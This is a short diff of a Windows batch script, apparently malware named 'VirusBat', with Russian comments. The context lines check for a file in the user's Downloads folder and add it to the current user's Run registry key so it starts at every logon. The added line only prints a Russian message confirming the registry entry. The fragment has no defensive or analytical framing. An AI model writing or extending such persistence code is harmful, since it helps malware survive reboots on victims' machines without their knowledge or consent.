@@ -23,6 +23,7 @@ if %errorlevel% == 0 (
     :: (Проверяем загрузки)
     if exist "%downloads%\%filename%" (
         reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "VirusBat" /t REG_SZ /d "%downloads%\%filename%" /f
+        echo Файл найден и добавлен в реестр
     )
 )
 
